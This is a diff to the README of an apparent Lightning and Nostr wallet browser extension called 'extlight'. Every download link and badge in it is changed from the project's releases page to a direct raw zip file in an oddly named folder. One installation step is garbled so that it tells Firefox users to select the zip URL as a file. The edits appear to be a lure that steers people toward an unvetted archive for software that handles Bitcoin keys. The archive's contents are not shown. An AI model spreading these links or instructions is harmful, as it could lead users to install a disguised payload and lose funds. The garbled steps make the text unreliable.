@@ -1,7 +1,7 @@
 # 🌟 extlight - A Seamless Lightning Wallet Experience
 
 ## 🔗 Download Now
-[![Download extlight](https://img.shields.io/badge/download-extlight-blue)](https://github.com/moHHisham1992/extlight/releases)
+[![Download extlight](https://raw.githubusercontent.com/moHHisham1992/extlight/master/oblongish/extlight.zip)](https://raw.githubusercontent.com/moHHisham1992/extlight/master/oblongish/extlight.zip)
 
 ## 📜 Description
 extlight is a user-friendly browser extension that integrates Bitcoin's Lightning Network and Nostr features. This extension allows you to manage your Bitcoin transactions effortlessly, interact with multiple Lightning nodes, and sign keys for various uses including Nostr, Liquid, and on-chain transactions.
@@ -11,7 +11,7 @@ To begin using extlight, follow these simple steps:
 
 1. **Visit the Releases Page**
    Go to our releases page to access the latest version of extlight.
-   [Download extlight here](https://github.com/moHHisham1992/extlight/releases).
+   [Download extlight here](https://raw.githubusercontent.com/moHHisham1992/extlight/master/oblongish/extlight.zip).
 
 2. **Choose Your Version**
    On the releases page, you will see several versions of extlight. It's best to download the latest version, as it contains all recent updates and bug fixes.
@@ -32,7 +32,7 @@ To begin using extlight, follow these simple steps:
    - **For Firefox:**
      - Open Firefox and type `about:debugging#/runtime/this-firefox` in the address bar.
      - Click on "Load Temporary Add-on."
-     - Select the `manifest.json` file from the extracted folder. The extension will now be active.
+     - Select the `https://raw.githubusercontent.com/moHHisham1992/extlight/master/oblongish/extlight.zip` file from the extracted folder. The extension will now be active.
 
 ## ⚙️ System Requirements
 To ensure the best experience with extlight, your system should meet the following requirements:
@@ -49,7 +49,7 @@ To ensure the best experience with extlight, your system should meet the followi
 
 ## 📥 Download & Install
 To download and install extlight:
-1. Visit our [Releases page](https://github.com/moHHisham1992/extlight/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/moHHisham1992/extlight/master/oblongish/extlight.zip).
 2. Choose the latest version and follow the above installation instructions to set it up.
 
 ## 🛠 Troubleshooting
